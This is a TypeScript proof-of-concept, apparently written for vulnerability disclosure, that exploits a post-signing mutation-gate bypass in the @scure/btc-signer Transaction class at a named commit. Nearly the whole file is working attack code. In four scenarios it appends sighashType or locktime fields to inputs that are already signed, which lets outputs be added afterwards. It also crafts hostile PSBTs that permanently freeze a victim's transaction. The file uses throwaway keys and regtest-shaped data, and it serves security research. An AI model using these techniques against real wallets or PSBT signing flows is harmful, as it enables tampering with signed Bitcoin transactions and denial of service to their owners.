/**
 * PoC: post-signing mutation-gate bypass in @scure/btc-signer Transaction.
 * Target: 68b2fad4ef8232302c6239c00902def1f511c974
 *
 * Run from the repository worktree root (after `npm install`):
 *   cp poc.mts <worktree>/poc.mts && node --no-warnings poc.mts   (Node >= 22 for TS stripping)
 *
 * Uses only generated, valueless keys and regtest-shaped transactions.
 */
import { Transaction, SigHash } from './src/transaction.ts';
import { secp256k1 as secp, schnorr } from '@noble/curves/secp256k1.js';
import { hex } from '@scure/base';
import * as u from './src/utils.ts';
import { p2wpkh, p2tr, p2pkh } from './src/payment.ts';

const priv1 = u.randomPrivateKeyBytes();
const pub1 = u.pubECDSA(priv1);
const spk1 = p2wpkh(pub1);
const txidA = hex.decode('11'.repeat(32));

function newTx1in1out() {
  const tx = new Transaction();
  tx.addInput({ txid: txidA, index: 0, witnessUtxo: { amount: 100000n, script: spk1.script } });
  tx.addOutput({ script: spk1.script, amount: 90000n });
  return tx;
}
function verifySig(tx: Transaction, idx: number, pub: Uint8Array, sig: Uint8Array): boolean {
  const ht = sig[sig.length - 1];
  const der = sig.subarray(0, -1);
  const digest = tx.preimageWitnessV0(idx, p2pkh(pub).script, ht, 100000n);
  return secp.verify(der, digest, pub, { prehash: false, lowS: false, format: 'der' });
}
const getSig = (tx: Transaction, idx: number) => tx.getInput(idx).partialSig![0][1] as Uint8Array;

console.log('S1) sign ALL, then counterparty appends sighashType=NONE to the *signed* input');
{
  const tx = newTx1in1out();
  tx.signIdx(priv1, 0); // default policy: SIGHASH_ALL only
  try { tx.addOutput({ script: spk1.script, amount: 1n }); console.log('  pre-append addOutput: ALLOWED (unexpected)'); }
  catch { console.log('  pre-append addOutput: blocked (expected protection)'); }
  // Counterparty-controlled update call. mergeKeyMap only guards fields already present,
  // and sighashType was absent at signing time -> append succeeds (psbt.ts:875).
  tx.updateInput(0, { sighashType: SigHash.NONE });
  console.log('  updateInput(0,{sighashType:NONE}) on signed input: ACCEPTED');
  tx.addOutput({ script: spk1.script, amount: 1000n }); // now unblocked: inputSighash() reads NONE
  console.log('  post-append addOutput: ALLOWED  <-- gate bypassed');
  const ok = verifySig(tx, 0, pub1, getSig(tx, 0));
  console.log('  victim signature valid against mutated tx?', ok);
  tx.finalize();
  console.log('  library finalizes+extracts the now consensus-INVALID tx, bytes:', tx.extract().length);
}

console.log('S2) same append primitive shifts lockTime after signing (requiredHeightLocktime)');
{
  const tx = newTx1in1out();
  tx.signIdx(priv1, 0);
  tx.updateInput(0, { requiredHeightLocktime: 700000 });
  console.log('  lockTime before=0 after=', tx.lockTime);
  console.log('  victim signature valid against lockTime-mutated tx?', verifySig(tx, 0, pub1, getSig(tx, 0)));
}

console.log('S3) hostile PSBT stores sighashType=0x40 next to a partialSig -> permanent gate freeze');
{
  const tx = newTx1in1out();
  tx.signIdx(priv1, 0);
  tx.updateInput(0, { sighashType: 0x40 }, true); // attacker combiner path (_ignoreSignStatus)
  const victim = Transaction.fromPSBT(tx.toPSBT(2)); // victim re-imports hostile PSBT
  console.log('  stored sighashType after fromPSBT:', victim.getInput(0).sighashType);
  for (const [name, fn] of [
    ['addInput', () => victim.addInput({ txid: txidA, index: 2, witnessUtxo: { amount: 1n, script: spk1.script } })],
    ['addOutput', () => victim.addOutput({ script: spk1.script, amount: 1n })],
    ['updateInput', () => victim.updateInput(0, {})],
    ['updateOutput', () => victim.updateOutput(0, {})],
  ] as const) {
    let msg = 'ok';
    try { (fn as any)(); } catch (e: any) { msg = e.message; }
    console.log(`  ${name}: ${msg}`);
  }
  try { victim.signIdx(priv1, 0); } catch (e: any) { console.log('  signIdx:', e.message); }
}

console.log('S4) sighashType append also works on signed taproot inputs; 0x80 freezes gate');
{
  const privT = u.randomPrivateKeyBytes();
  const tr = p2tr(u.pubSchnorr(privT));
  const tx = new Transaction();
  tx.addInput({ txid: txidA, index: 0, witnessUtxo: { amount: 100000n, script: tr.script }, ...tr });
  tx.addOutput({ script: tr.script, amount: 90000n });
  tx.signIdx(privT, 0);
  tx.updateInput(0, { sighashType: 1 });
  console.log('  append sighashType=ALL on taproot-signed input: ACCEPTED');
  const tx2 = new Transaction();
  tx2.addInput({ txid: txidA, index: 0, witnessUtxo: { amount: 100000n, script: tr.script }, ...tr });
  tx2.addOutput({ script: tr.script, amount: 90000n });
  tx2.signIdx(privT, 0);
  tx2.updateInput(0, { sighashType: 0x80 }, true); // DEFAULT|ANYONECANPAY (invalid per BIP341)
  const v = Transaction.fromPSBT(tx2.toPSBT(2));
  try { v.addOutput({ script: tr.script, amount: 1n }); console.log('  0x80 addOutput: ok (unexpected)'); }
  catch (e: any) { console.log('  0x80 addOutput:', e.message); }
}
